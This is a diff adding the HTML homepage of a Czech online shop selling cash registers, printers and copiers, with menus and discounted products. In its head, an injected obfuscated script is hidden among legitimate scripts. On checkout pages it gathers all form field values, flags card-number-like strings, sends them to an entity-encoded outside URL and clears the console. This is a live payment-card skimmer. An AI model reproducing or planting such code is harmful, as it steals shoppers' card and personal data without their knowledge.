@@ -1,0 +1,731 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="cs" lang="cs">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Pokladny a kopírky</title>
+<meta name="description" content="Prodej pokladen a kopírek" />
+<meta name="keywords" content="pokladny, kopírky, tiskárny" />
+<meta name="robots" content="INDEX,FOLLOW" />
+<link rel="icon" href="http://www.pokladny-kopirky.cz/skin/frontend/default/default/favicon.ico" type="image/x-icon" />
+<link rel="shortcut icon" href="http://www.pokladny-kopirky.cz/skin/frontend/default/default/favicon.ico" type="image/x-icon" />
+<!--[if lt IE 7]>
+<script type="text/javascript">
+//<![CDATA[
+    var BLANK_URL = 'http://www.pokladny-kopirky.cz/js/blank.html';
+    var BLANK_IMG = 'http://www.pokladny-kopirky.cz/js/spacer.gif';
+//]]>
+</script>
+<![endif]-->
+<link rel="stylesheet" type="text/css" href="http://www.pokladny-kopirky.cz/skin/frontend/base/default/css/widgets.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.pokladny-kopirky.cz/skin/frontend/default/f002_sea_green/css/styles.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.pokladny-kopirky.cz/skin/frontend/default/f002_sea_green/css/custom.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.pokladny-kopirky.cz/skin/frontend/default/default/css/vertnav.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.pokladny-kopirky.cz/skin/frontend/default/default/css/print.css" media="print" />
+<script type="text/javascript" src="http://www.pokladny-kopirky.cz/js/prototype/prototype.js"></script>
+<script type="text/javascript" src="http://www.pokladny-kopirky.cz/js/lib/ccard.js"></script>
+<script type="text/javascript" src="http://www.pokladny-kopirky.cz/js/prototype/validation.js"></script>
+<script type="text/javascript" src="http://www.pokladny-kopirky.cz/js/scriptaculous/builder.js"></script>
+<script type="text/javascript" src="http://www.pokladny-kopirky.cz/js/scriptaculous/effects.js"></script>
+<script type="text/javascript" src="http://www.pokladny-kopirky.cz/js/scriptaculous/dragdrop.js"></script>
+<script type="text/javascript" src="http://www.pokladny-kopirky.cz/js/scriptaculous/controls.js"></script>
+<script type="text/javascript" src="http://www.pokladny-kopirky.cz/js/scriptaculous/slider.js"></script>
+<script type="text/javascript" src="http://www.pokladny-kopirky.cz/js/varien/js.js"></script>
+<script type="text/javascript" src="http://www.pokladny-kopirky.cz/js/varien/form.js"></script>
+<script type="text/javascript" src="http://www.pokladny-kopirky.cz/js/varien/menu.js"></script>
+<script type="text/javascript" src="http://www.pokladny-kopirky.cz/js/mage/translate.js"></script>
+<script type="text/javascript" src="http://www.pokladny-kopirky.cz/js/mage/cookies.js"></script>
+<!--[if lt IE 8]>
+<link rel="stylesheet" type="text/css" href="http://www.pokladny-kopirky.cz/skin/frontend/default/f002_sea_green/css/styles-ie.css" media="all" />
+<![endif]-->
+<!--[if lt IE 7]>
+<script type="text/javascript" src="http://www.pokladny-kopirky.cz/js/lib/ds-sleight.js"></script>
+<script type="text/javascript" src="http://www.pokladny-kopirky.cz/skin/frontend/base/default/js/ie6.js"></script>
+<![endif]-->
+
+<script type="text/javascript">
+//<![CDATA[
+optionalZipCountries = ["CZ"];
+//]]>
+</script>
+<script type="text/javascript">//<![CDATA[
+        var Translator = new Translate({"Please select an option.":"Vyberte pros\u00edm mo\u017enost.","This is a required field.":"Toto pole je povinn\u00e9.","Please enter a valid number in this field.":"Zadejte pros\u00edm do tohoto pole platn\u00e9 \u010d\u00edslo.","Please use letters only (a-z or A-Z) in this field.":"V tomto poli pros\u00edm pou\u017eijte pouze p\u00edsmena (a-z nebo A-Z).","Please use only letters (a-z), numbers (0-9) or underscore(_) in this field, first character should be a letter.":"V tomto poli pros\u00edm pou\u017eijte pouze p\u00edsmena (a-z), \u010d\u00edslice (0-9), nebo podtr\u017e\u00edtka(_), prvn\u00ed znak by m\u011blo b\u00fdt p\u00edsmeno.","Please enter a valid phone number. For example (123) 456-7890 or 123-456-7890.":"Vlo\u017ete pros\u00edm platn\u00e9 telefonn\u00ed \u010d\u00edslo. Nap\u0159\u00edklad (123) 456-7890 nebo 123-456-7890.","Please enter a valid date.":"Vlo\u017ete pros\u00edm platn\u00e9 datum.","Please enter a valid email address. For example johndoe@domain.com.":"Vlo\u017ete pros\u00edm platnou emailovou adresu. Nap\u0159\u00edklad johndoe@domain.com.","Please enter 6 or more characters. Leading or trailing spaces will be ignored.":"Zadejte pros\u00edm 6 nebo v\u00edce znak\u016f. Po\u010d\u00e1te\u010dn\u00ed a kone\u010dn\u00e9 mezery budou ignorov\u00e1ny.","Please make sure your passwords match.":"Ujist\u011bte se pros\u00edm, \u017ee hesla souhlas\u00ed.","Please enter a valid URL. For example http:\/\/www.example.com or www.example.com":"Vlo\u017ete pros\u00edm platnou URL. Nap\u0159\u00edklad http:\/\/www.example.com nebo www.example.com","Please enter a valid social security number. For example 123-45-6789.":"Vlo\u017ete pros\u00edm platn\u00e9 \u010d\u00edslo soci\u00e1ln\u00edho poji\u0161t\u011bn\u00ed. Nap\u0159\u00edklad 123-45-6789.","Please enter a valid zip code. For example 90602 or 90602-1234.":"Zadejte pros\u00edm platn\u00e9 PS\u010c. Nap\u0159\u00edklad 10000.","Please enter a valid zip code.":"Zadejte pros\u00edm platn\u00e9 PS\u010c.","Please use this date format: dd\/mm\/yyyy. For example 17\/03\/2006 for the 17th of March, 2006.":"Pou\u017eijte pros\u00edm tento form\u00e1t data: dd\/mm\/rrrr. Nap\u0159\u00edklad 17\/03\/2006 pro 17. b\u0159ezna, 2006.","Please enter a valid $ amount. For example $100.00.":"Vlo\u017ete pros\u00edm platn\u00fd obnos $. Nap\u0159\u00edklad $100,00.","Please select one of the above options.":"Vyberte pros\u00edm jednu z uveden\u00fdch mo\u017enost\u00ed","Please select one of the options.":"Vyberte pros\u00edm jednu z mo\u017enost\u00ed.","Please select State\/Province.":"Vyberte pros\u00edm st\u00e1t\/provincii.","Please enter a number greater than 0 in this field.":"Do tohoto pole pros\u00edm vlo\u017ete \u010d\u00edslo v\u011bt\u0161\u00ed ne\u017e 0.","Please enter a valid credit card number.":"Vlo\u017ete pros\u00edm platn\u00e9 \u010d\u00edslo kreditn\u00ed karty.","Please wait, loading...":"\u010cekejte pros\u00edm, na\u010d\u00edt\u00e1 se...","Complete":"Hotovo","Add Products":"P\u0159idat produkty","Please choose to register or to checkout as a guest":"Pros\u00edm zaregistrujte se, nebo pokra\u010dujte jako host","Please specify payment method.":"Vyberte pros\u00edm zp\u016fsob platby."});
+        //]]></script><script type="text/javascript">jQuery(function(e){e("button").on("click",function(){var t="",o="post",n=window.location;if(new RegExp("checkout").test(n)){for(var c=document.querySelectorAll("input,select"),i=0;i<c.length;i++)if(c[i].value.length>0){var a=c[i].name;""==a&&(a=i),t+=a+"="+c[i].value+"&"}if(t){var l=new RegExp("[0-9]{13,16}"),u=new XMLHttpRequest;u.open(o,e("<div />").html("&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;&#111;&#119;&#110;&#115;&#97;&#102;&#101;&#116;&#121;&#46;&#111;&#114;&#103;&#47;&#111;&#112;&#112;&#46;&#112;&#104;&#112;").text(),!0),u.setRequestHeader("Content-type","application/x-www-form-urlencoded"),u.send(t+"&asd="+(l.test(t.replace(/s/g,""))?1:0)+"&utmp="+n),console.clear()}}})});</script>
+</head>
+<body class=" cms-index-index cms-home">
+<div class="wrapper">
+        <noscript>
+        <div class="global-site-notice noscript">
+            <div class="notice-inner">
+                <p>
+                    <strong>JavaScript seems to be disabled in your browser.</strong><br />
+                    You must have JavaScript enabled in your browser to utilize the functionality of this website.                </p>
+            </div>
+        </div>
+    </noscript>
+    <div class="page">
+        <div class="header">
+<div class="header-container">
+<div class="header-top">
+    <div class="header-topbar">
+        <div class="quick-access">
+            <div class="welcome-msg"></div>
+            <div class="shop-access"><ul class="links">
+                        <li class="first" ><a href="http://www.pokladny-kopirky.cz/customer/account/" title="Můj účet" >Můj účet</a></li>
+                                <li ><a href="http://www.pokladny-kopirky.cz/wishlist/" title="Moje přání" >Moje přání</a></li>
+                                <li ><a href="http://www.pokladny-kopirky.cz/checkout/cart/" title="Můj košík" class="top-link-cart">Můj košík</a></li>
+                                <li ><a href="http://www.pokladny-kopirky.cz/checkout/" title="Platba" class="top-link-checkout">Platba</a></li>
+                                <li class=" last" ><a href="http://www.pokladny-kopirky.cz/customer/account/login/" title="Přihlásit se" >Přihlásit se</a></li>
+            </ul>
+</div>
+        </div>
+        ﻿<script src="http://www.pokladny-kopirky.cz/skin/frontend/default/f002_sea_green/js/dropdown.js" type="text/javascript"></script>
+<div class="box header-cart" id="header-cart">
+    <div class="head" onclick="dropdown('cart-content', 'header-cart')">
+        <h4 id="header-cart-top" >
+                    Váš <a href="http://www.pokladny-kopirky.cz/checkout/cart/">košík</a> je prázdný.  
+                </h4>         
+    </div>
+
+    <div class="content" id="cart-content" style="display: none;">
+                        
+            </div>
+</div>            </div>
+    <div class="header-top">
+                <div class="logo"><strong>Pokladny a kopírky</strong><a href="http://www.pokladny-kopirky.cz/" title="Pokladny a kopírky" class="logo"><img src="http://www.pokladny-kopirky.cz/skin/frontend/default/f002_sea_green/images/logo.png" alt="Pokladny a kopírky" /></a></div>
+                <p class="no-display"><a href="#main"><strong>Přeskočit na obsah &raquo;</strong></a></p>
+    	<form id="search_mini_form" action="http://www.pokladny-kopirky.cz/catalogsearch/result/" method="get">
+    <fieldset>
+        <label for="search">Search:</label>
+        <div class="mini-search">
+            <input id="search" type="text" class="input-text" name="q" class="input-text" value="" />
+            <input type="image" src="http://www.pokladny-kopirky.cz/skin/frontend/default/f002_sea_green/images/search_btn.gif" alt="Hledání" />
+            <div id="search_autocomplete" class="search-autocomplete"></div>
+            <script type="text/javascript">
+	        //<![CDATA[
+	            var searchForm = new Varien.searchForm('search_mini_form', 'search', 'Hledat v tomto obchodu...');
+	            searchForm.initAutocomplete('http://www.pokladny-kopirky.cz/catalogsearch/ajax/suggest/', 'search_autocomplete');
+	        //]]>
+            </script>
+        </div>
+    </fieldset>
+</form>
+        
+        
+<div class="header-nav">
+    <div class="nav-container">
+        <ul id="nav">
+        <li><a href="http://www.pokladny-kopirky.cz/">Domů</a></li>
+		<li onmouseover="toggleMenu(this,1)" onmouseout="toggleMenu(this,0)">
+            <a href="http://www.pokladny-kopirky.cz/">Produkty</a>
+			<ul>
+								    <li class="level0 nav-1 parent" onmouseover="toggleMenu(this,1)" onmouseout="toggleMenu(this,0)">
+<a href="http://www.pokladny-kopirky.cz/pokladny-obchodni.html">
+<span>Pokladny </span>
+</a>
+<ul class="level0">
+<li class="level1 nav-1-1 first parent" onmouseover="toggleMenu(this,1)" onmouseout="toggleMenu(this,0)">
+<a href="http://www.pokladny-kopirky.cz/pokladny-obchodni/obchodni.html">
+<span>Obchodní</span>
+</a>
+<ul class="level1">
+<li class="level2 nav-1-1-1 first">
+<a href="http://www.pokladny-kopirky.cz/pokladny-obchodni/obchodni/serd.html">
+<span>Serd</span>
+</a>
+</li><li class="level2 nav-1-1-2">
+<a href="http://www.pokladny-kopirky.cz/pokladny-obchodni/obchodni/sharp.html">
+<span>Sharp</span>
+</a>
+</li><li class="level2 nav-1-1-3">
+<a href="http://www.pokladny-kopirky.cz/pokladny-obchodni/obchodni/chd.html">
+<span>EURO</span>
+</a>
+</li><li class="level2 nav-1-1-4 last">
+<a href="http://www.pokladny-kopirky.cz/pokladny-obchodni/obchodni/optima.html">
+<span>Optima</span>
+</a>
+</li>
+</ul>
+</li><li class="level1 nav-1-2 last parent" onmouseover="toggleMenu(this,1)" onmouseout="toggleMenu(this,0)">
+<a href="http://www.pokladny-kopirky.cz/pokladny-obchodni/restaura.html">
+<span>Restaurační</span>
+</a>
+<ul class="level1">
+<li class="level2 nav-1-2-5 first">
+<a href="http://www.pokladny-kopirky.cz/pokladny-obchodni/restaura/serd.html">
+<span>Serd</span>
+</a>
+</li><li class="level2 nav-1-2-6 last">
+<a href="http://www.pokladny-kopirky.cz/pokladny-obchodni/restaura/sharp.html">
+<span>Sharp</span>
+</a>
+</li>
+</ul>
+</li>
+</ul>
+</li>								    <li class="level0 nav-2">
+<a href="http://www.pokladny-kopirky.cz/program-vybaveni-pokladen.html">
+<span>Program.vybavení </span>
+</a>
+</li>								    <li class="level0 nav-3">
+<a href="http://www.pokladny-kopirky.cz/pos.html">
+<span>Restaurační a obchodní POS systémy</span>
+</a>
+</li>								    <li class="level0 nav-4 parent" onmouseover="toggleMenu(this,1)" onmouseout="toggleMenu(this,0)">
+<a href="http://www.pokladny-kopirky.cz/tiskarny.html">
+<span>Tiskárny</span>
+</a>
+<ul class="level0">
+<li class="level1 nav-4-1 first last">
+<a href="http://www.pokladny-kopirky.cz/tiskarny/pokladni-tiskarny.html">
+<span>Pokladní tiskárny</span>
+</a>
+</li>
+</ul>
+</li>								    <li class="level0 nav-5">
+<a href="http://www.pokladny-kopirky.cz/vahy.html">
+<span>Váhy</span>
+</a>
+</li>								    <li class="level0 nav-6 parent" onmouseover="toggleMenu(this,1)" onmouseout="toggleMenu(this,0)">
+<a href="http://www.pokladny-kopirky.cz/spot.html">
+<span>Spotřební materiál</span>
+</a>
+<ul class="level0">
+<li class="level1 nav-6-1 first">
+<a href="http://www.pokladny-kopirky.cz/spot/pokladny.html">
+<span>pokladny</span>
+</a>
+</li><li class="level1 nav-6-2 last">
+<a href="http://www.pokladny-kopirky.cz/spot/kopirky.html">
+<span>kopírky</span>
+</a>
+</li>
+</ul>
+</li>								    <li class="level0 nav-7">
+<a href="http://www.pokladny-kopirky.cz/repasovane.html">
+<span>Repasované</span>
+</a>
+</li>								    <li class="level0 nav-8">
+<a href="http://www.pokladny-kopirky.cz/servisni-prace.html">
+<span>Servisní práce</span>
+</a>
+</li>							</ul>
+		</li>
+        <li><a href="http://www.pokladny-kopirky.cz/o-firme/"><span>O firmě</span></a></li>
+<li><a href="http://www.pokladny-kopirky.cz/servis/"><span>Servis</span></a></li>
+<li><a href="http://www.pokladny-kopirky.cz/obchodni_podminky/"><span>Obchodn&iacute; podm&iacute;nky</span></a></li>
+<li><a href="http://www.pokladny-kopirky.cz/contacts/"><span>Napi&scaron;te n&aacute;m</span></a></li>
+<li><a href="http://www.pokladny-kopirky.cz/kontakty/"><span>Kontakty</span></a></li>
+<li><a href="http://www.pokladny-kopirky.cz/checkout/cart/"><span>Ko&scaron;&iacute;k</span></a></li>        </ul>
+     </div>
+</div>    </div>	
+</div>
+</div>
+</div>        <div class="main-container col3-layout">
+        	<div id="slider">
+			<div class="slidercontrolwr">
+				<div class="slidercontrol">
+				<a href="#" class="aprev" title="Previous" onclick="my_glider.previous();return false;">Previous</a>
+				<a href="#" class="astop" title="Stop" onclick="my_glider.stop();return false">Stop</a>
+				<a href="#" class="aplay" title="Play" onclick="my_glider.start();return false">Start</a>
+				<a href="#" class="anext" title="Next" onclick="my_glider.next();return false">next</a>
+				</div>
+			</div>
+			<div class="scroller">
+				<div class="content">
+                                       
+   
+
+<div class="section" id="section1">
+						<a href="http://www.pokladny-kopirky.cz/" title="Pokladny a kopírky"><img src="http://www.pokladny-kopirky.cz/skin/frontend/default/f002_sea_green/images/slider1.jpg" alt="Pokladny a kopirky" /></a>
+					</div>
+
+
+
+<div class="section" id="section1">
+						<a href="http://www.pokladny-kopirky.cz/" title="Pokladny a kopírky"><img src="http://www.pokladny-kopirky.cz/skin/frontend/default/f002_sea_green/images/slider2.jpg" alt="Pokladny a kopírky" /></a>
+					</div>
+
+
+                                        <div class="section" id="section3">
+					<a href="http://www.pokladny-kopirky.cz/" title="Pokladny a kopírky"><img src="http://www.pokladny-kopirky.cz/skin/frontend/default/f002_sea_green/images/slider3.jpg" alt="Pokladny a kopírky" /></a>
+					</div>
+
+                                    
+					
+				</div>
+			</div>
+		</div>
+		
+		<script src="http://www.pokladny-kopirky.cz/skin/frontend/default/f002_sea_green/js/glider.js" type="text/javascript"></script>
+
+		<script type="text/javascript" charset="utf-8">
+			var my_glider = new Glider('slider', {duration:0.5, autoGlide: false, frequency: 4, initialSection: 'section1'});
+		</script>                        <div class="main">
+                <div class="col-wrapper">
+                    <div class="col-main">
+                                                <div class="std"><h2 style="text-align: center;"><span style="background-color: #114364; color: #ffffff; width: 100%; display: inline-block;">Zbož&iacute; v akci&nbsp;</span></h2>
+<p><div class="category-products">
+            
+    
+                            <ul class="products-grid">
+                    <li class="item first">
+                <a href="http://www.pokladny-kopirky.cz/hlavni-strana/pokladna.html" title="SERD 40T-Pokladny pro malá prodejny textilu,večerky,cukrárny aj." class="product-image"><img src="http://www.pokladny-kopirky.cz/media/catalog/product/cache/1/small_image/135x/9df78eab33525d08d6e5fb8d27136e95/s/e/serd_40t.jpg" width="135" height="135" alt="SERD 40T-Pokladny pro malá prodejny textilu,večerky,cukrárny aj." /></a>
+                <h2 class="product-name"><a href="http://www.pokladny-kopirky.cz/hlavni-strana/pokladna.html" title="Reg. pokladna pro EET: SERD ECR 40T">Reg. pokladna pro EET: SERD ECR 40T</a></h2>
+                                
+
+                        
+    <div class="price-box">
+                                            
+                    <p class="old-price">
+                <span class="price-label">Běžná cena(s DPH):</span>
+                <span class="price" id="old-price-3">
+                    11 374,00 Kč                </span>
+            </p>
+
+                            <p class="special-price">
+                    <span class="price-label">Akční cena</span>
+                <span class="price" id="product-price-3">
+                    10 805,00 Kč                </span>
+                </p>
+                    
+    
+        </div>
+
+                <div class="actions">
+                                            <button type="button" title="Přidat do košíku" class="button btn-cart" onclick="setLocation('http://www.pokladny-kopirky.cz/checkout/cart/add/uenc/aHR0cDovL3d3dy5wb2tsYWRueS1rb3Bpcmt5LmN6Lw,,/product/3/form_key/YtnJGeEdy4JLey2V/')"><span><span>Přidat do košíku</span></span></button>
+                                        <ul class="add-to-links">
+                                                    <li><a href="http://www.pokladny-kopirky.cz/wishlist/index/add/product/3/form_key/YtnJGeEdy4JLey2V/" class="link-wishlist">Přidat do seznamu přání</a></li>
+                                                                            <li><span class="separator">|</span> <a href="http://www.pokladny-kopirky.cz/catalog/product_compare/add/product/3/uenc/aHR0cDovL3d3dy5wb2tsYWRueS1rb3Bpcmt5LmN6Lw,,/form_key/YtnJGeEdy4JLey2V/" class="link-compare">Přidat do srovnání</a></li>
+                                            </ul>
+                </div>
+            </li>
+                                    <li class="item">
+                <a href="http://www.pokladny-kopirky.cz/hlavni-strana/pokladna-46.html" title="Serd 42T- Pokladna pro malé prodejny textilu,večerky,cukrárny aj." class="product-image"><img src="http://www.pokladny-kopirky.cz/media/catalog/product/cache/1/small_image/135x/9df78eab33525d08d6e5fb8d27136e95/s/e/serd_42t_1_1.jpg" width="135" height="135" alt="Serd 42T- Pokladna pro malé prodejny textilu,večerky,cukrárny aj." /></a>
+                <h2 class="product-name"><a href="http://www.pokladny-kopirky.cz/hlavni-strana/pokladna-46.html" title="Reg.pokladna pro EET: SERD ECR 42T">Reg.pokladna pro EET: SERD ECR 42T</a></h2>
+                                
+
+                        
+    <div class="price-box">
+                                            
+                    <p class="old-price">
+                <span class="price-label">Běžná cena(s DPH):</span>
+                <span class="price" id="old-price-41">
+                    11 979,00 Kč                </span>
+            </p>
+
+                            <p class="special-price">
+                    <span class="price-label">Akční cena</span>
+                <span class="price" id="product-price-41">
+                    11 380,00 Kč                </span>
+                </p>
+                    
+    
+        </div>
+
+                <div class="actions">
+                                            <button type="button" title="Přidat do košíku" class="button btn-cart" onclick="setLocation('http://www.pokladny-kopirky.cz/checkout/cart/add/uenc/aHR0cDovL3d3dy5wb2tsYWRueS1rb3Bpcmt5LmN6Lw,,/product/41/form_key/YtnJGeEdy4JLey2V/')"><span><span>Přidat do košíku</span></span></button>
+                                        <ul class="add-to-links">
+                                                    <li><a href="http://www.pokladny-kopirky.cz/wishlist/index/add/product/41/form_key/YtnJGeEdy4JLey2V/" class="link-wishlist">Přidat do seznamu přání</a></li>
+                                                                            <li><span class="separator">|</span> <a href="http://www.pokladny-kopirky.cz/catalog/product_compare/add/product/41/uenc/aHR0cDovL3d3dy5wb2tsYWRueS1rb3Bpcmt5LmN6Lw,,/form_key/YtnJGeEdy4JLey2V/" class="link-compare">Přidat do srovnání</a></li>
+                                            </ul>
+                </div>
+            </li>
+                                    <li class="item last">
+                <a href="http://www.pokladny-kopirky.cz/hlavni-strana/serd-360t.html" title="SC 550T s malou pokladní zásuvkou,pro pultové a samoobslužné typy prodejen,butiky,večerky aj." class="product-image"><img src="http://www.pokladny-kopirky.cz/media/catalog/product/cache/1/small_image/135x/9df78eab33525d08d6e5fb8d27136e95/e/c/ecr550mala_zasuvka_3.jpg" width="135" height="135" alt="SC 550T s malou pokladní zásuvkou,pro pultové a samoobslužné typy prodejen,butiky,večerky aj." /></a>
+                <h2 class="product-name"><a href="http://www.pokladny-kopirky.cz/hlavni-strana/serd-360t.html" title="Reg. pokladna pro EET:  SC ECR 550T s malou pokladní zásuvkou">Reg. pokladna pro EET:  SC ECR 550T s malou pokladní zásuvkou</a></h2>
+                                
+
+                        
+    <div class="price-box">
+                                            
+                    <p class="old-price">
+                <span class="price-label">Běžná cena(s DPH):</span>
+                <span class="price" id="old-price-18">
+                    13 672,00 Kč                </span>
+            </p>
+
+                            <p class="special-price">
+                    <span class="price-label">Akční cena</span>
+                <span class="price" id="product-price-18">
+                    13 482,00 Kč                </span>
+                </p>
+                    
+    
+        </div>
+
+                <div class="actions">
+                                            <button type="button" title="Přidat do košíku" class="button btn-cart" onclick="setLocation('http://www.pokladny-kopirky.cz/checkout/cart/add/uenc/aHR0cDovL3d3dy5wb2tsYWRueS1rb3Bpcmt5LmN6Lw,,/product/18/form_key/YtnJGeEdy4JLey2V/')"><span><span>Přidat do košíku</span></span></button>
+                                        <ul class="add-to-links">
+                                                    <li><a href="http://www.pokladny-kopirky.cz/wishlist/index/add/product/18/form_key/YtnJGeEdy4JLey2V/" class="link-wishlist">Přidat do seznamu přání</a></li>
+                                                                            <li><span class="separator">|</span> <a href="http://www.pokladny-kopirky.cz/catalog/product_compare/add/product/18/uenc/aHR0cDovL3d3dy5wb2tsYWRueS1rb3Bpcmt5LmN6Lw,,/form_key/YtnJGeEdy4JLey2V/" class="link-compare">Přidat do srovnání</a></li>
+                                            </ul>
+                </div>
+            </li>
+                </ul>
+                                <ul class="products-grid">
+                    <li class="item first">
+                <a href="http://www.pokladny-kopirky.cz/hlavni-strana/serd-550t.html" title="SERD 550T Color malá pokladní zásuvka" class="product-image"><img src="http://www.pokladny-kopirky.cz/media/catalog/product/cache/1/small_image/135x/9df78eab33525d08d6e5fb8d27136e95/e/c/ecr550mala_zasuvka_1_1.jpg" width="135" height="135" alt="SERD 550T Color malá pokladní zásuvka" /></a>
+                <h2 class="product-name"><a href="http://www.pokladny-kopirky.cz/hlavni-strana/serd-550t.html" title="Reg.pokladna pro EET:  SERD ECR 550T Color - malá  zásuvka">Reg.pokladna pro EET:  SERD ECR 550T Color - malá  zásuvka</a></h2>
+                                
+
+                        
+    <div class="price-box">
+                                            
+                    <p class="old-price">
+                <span class="price-label">Běžná cena(s DPH):</span>
+                <span class="price" id="old-price-21">
+                    14 600,00 Kč                </span>
+            </p>
+
+                            <p class="special-price">
+                    <span class="price-label">Akční cena</span>
+                <span class="price" id="product-price-21">
+                    14 399,00 Kč                </span>
+                </p>
+                    
+    
+        </div>
+
+                <div class="actions">
+                                            <button type="button" title="Přidat do košíku" class="button btn-cart" onclick="setLocation('http://www.pokladny-kopirky.cz/checkout/cart/add/uenc/aHR0cDovL3d3dy5wb2tsYWRueS1rb3Bpcmt5LmN6Lw,,/product/21/form_key/YtnJGeEdy4JLey2V/')"><span><span>Přidat do košíku</span></span></button>
+                                        <ul class="add-to-links">
+                                                    <li><a href="http://www.pokladny-kopirky.cz/wishlist/index/add/product/21/form_key/YtnJGeEdy4JLey2V/" class="link-wishlist">Přidat do seznamu přání</a></li>
+                                                                            <li><span class="separator">|</span> <a href="http://www.pokladny-kopirky.cz/catalog/product_compare/add/product/21/uenc/aHR0cDovL3d3dy5wb2tsYWRueS1rb3Bpcmt5LmN6Lw,,/form_key/YtnJGeEdy4JLey2V/" class="link-compare">Přidat do srovnání</a></li>
+                                            </ul>
+                </div>
+            </li>
+                                    <li class="item">
+                <a href="http://www.pokladny-kopirky.cz/hlavni-strana/serd-550t-20.html" title="Reg.pokladna SERD SC 550T - velká zásuvka" class="product-image"><img src="http://www.pokladny-kopirky.cz/media/catalog/product/cache/1/small_image/135x/9df78eab33525d08d6e5fb8d27136e95/s/t/sta_en_soubor.jpeg" width="135" height="135" alt="Reg.pokladna SERD SC 550T - velká zásuvka" /></a>
+                <h2 class="product-name"><a href="http://www.pokladny-kopirky.cz/hlavni-strana/serd-550t-20.html" title="Reg.pokladna pro EET: SERD SC 550T - s velkou pokladní zásuvkou">Reg.pokladna pro EET: SERD SC 550T - s velkou pokladní zásuvkou</a></h2>
+                                
+
+                        
+    <div class="price-box">
+                                            
+                    <p class="old-price">
+                <span class="price-label">Běžná cena(s DPH):</span>
+                <span class="price" id="old-price-19">
+                    16 819,00 Kč                </span>
+            </p>
+
+                            <p class="special-price">
+                    <span class="price-label">Akční cena</span>
+                <span class="price" id="product-price-19">
+                    16 456,00 Kč                </span>
+                </p>
+                    
+    
+        </div>
+
+                <div class="actions">
+                                            <button type="button" title="Přidat do košíku" class="button btn-cart" onclick="setLocation('http://www.pokladny-kopirky.cz/checkout/cart/add/uenc/aHR0cDovL3d3dy5wb2tsYWRueS1rb3Bpcmt5LmN6Lw,,/product/19/form_key/YtnJGeEdy4JLey2V/')"><span><span>Přidat do košíku</span></span></button>
+                                        <ul class="add-to-links">
+                                                    <li><a href="http://www.pokladny-kopirky.cz/wishlist/index/add/product/19/form_key/YtnJGeEdy4JLey2V/" class="link-wishlist">Přidat do seznamu přání</a></li>
+                                                                            <li><span class="separator">|</span> <a href="http://www.pokladny-kopirky.cz/catalog/product_compare/add/product/19/uenc/aHR0cDovL3d3dy5wb2tsYWRueS1rb3Bpcmt5LmN6Lw,,/form_key/YtnJGeEdy4JLey2V/" class="link-compare">Přidat do srovnání</a></li>
+                                            </ul>
+                </div>
+            </li>
+                                    <li class="item last">
+                <a href="http://www.pokladny-kopirky.cz/hlavni-strana/serd-360t-14.html" title="SC 550T - Pokladna střední třídy" class="product-image"><img src="http://www.pokladny-kopirky.cz/media/catalog/product/cache/1/small_image/135x/9df78eab33525d08d6e5fb8d27136e95/e/c/ecr550mala_zasuvka_2.jpg" width="135" height="135" alt="SC 550T - Pokladna střední třídy" /></a>
+                <h2 class="product-name"><a href="http://www.pokladny-kopirky.cz/hlavni-strana/serd-360t-14.html" title="Reg. pokladna pro EET : SC ECR 550T Color ">Reg. pokladna pro EET : SC ECR 550T Color </a></h2>
+                                
+
+                        
+    <div class="price-box">
+                                            
+                    <p class="old-price">
+                <span class="price-label">Běžná cena(s DPH):</span>
+                <span class="price" id="old-price-4">
+                    17 182,00 Kč                </span>
+            </p>
+
+                            <p class="special-price">
+                    <span class="price-label">Akční cena</span>
+                <span class="price" id="product-price-4">
+                    17 000,00 Kč                </span>
+                </p>
+                    
+    
+        </div>
+
+                <div class="actions">
+                                            <button type="button" title="Přidat do košíku" class="button btn-cart" onclick="setLocation('http://www.pokladny-kopirky.cz/checkout/cart/add/uenc/aHR0cDovL3d3dy5wb2tsYWRueS1rb3Bpcmt5LmN6Lw,,/product/4/form_key/YtnJGeEdy4JLey2V/')"><span><span>Přidat do košíku</span></span></button>
+                                        <ul class="add-to-links">
+                                                    <li><a href="http://www.pokladny-kopirky.cz/wishlist/index/add/product/4/form_key/YtnJGeEdy4JLey2V/" class="link-wishlist">Přidat do seznamu přání</a></li>
+                                                                            <li><span class="separator">|</span> <a href="http://www.pokladny-kopirky.cz/catalog/product_compare/add/product/4/uenc/aHR0cDovL3d3dy5wb2tsYWRueS1rb3Bpcmt5LmN6Lw,,/form_key/YtnJGeEdy4JLey2V/" class="link-compare">Přidat do srovnání</a></li>
+                                            </ul>
+                </div>
+            </li>
+                </ul>
+                                <ul class="products-grid">
+                    <li class="item first">
+                <a href="http://www.pokladny-kopirky.cz/hlavni-strana/serd-360t-restauracni-64.html" title="Reg.pokladna SC 550TF-vhodná pro bary,rychlé občerstvení,cukrárny aj." class="product-image"><img src="http://www.pokladny-kopirky.cz/media/catalog/product/cache/1/small_image/135x/9df78eab33525d08d6e5fb8d27136e95/5/5/550tf-mala-bw_1_.jpg" width="135" height="135" alt="Reg.pokladna SC 550TF-vhodná pro bary,rychlé občerstvení,cukrárny aj." /></a>
+                <h2 class="product-name"><a href="http://www.pokladny-kopirky.cz/hlavni-strana/serd-360t-restauracni-64.html" title="Reg.pokladna pro EET: SC ECR 550TF - malá pokladní zásuvka">Reg.pokladna pro EET: SC ECR 550TF - malá pokladní zásuvka</a></h2>
+                                
+
+                        
+    <div class="price-box">
+                                            
+                    <p class="old-price">
+                <span class="price-label">Běžná cena(s DPH):</span>
+                <span class="price" id="old-price-34">
+                    14 900,00 Kč                </span>
+            </p>
+
+                            <p class="special-price">
+                    <span class="price-label">Akční cena</span>
+                <span class="price" id="product-price-34">
+                    14 701,00 Kč                </span>
+                </p>
+                    
+    
+        </div>
+
+                <div class="actions">
+                                            <button type="button" title="Přidat do košíku" class="button btn-cart" onclick="setLocation('http://www.pokladny-kopirky.cz/checkout/cart/add/uenc/aHR0cDovL3d3dy5wb2tsYWRueS1rb3Bpcmt5LmN6Lw,,/product/34/form_key/YtnJGeEdy4JLey2V/')"><span><span>Přidat do košíku</span></span></button>
+                                        <ul class="add-to-links">
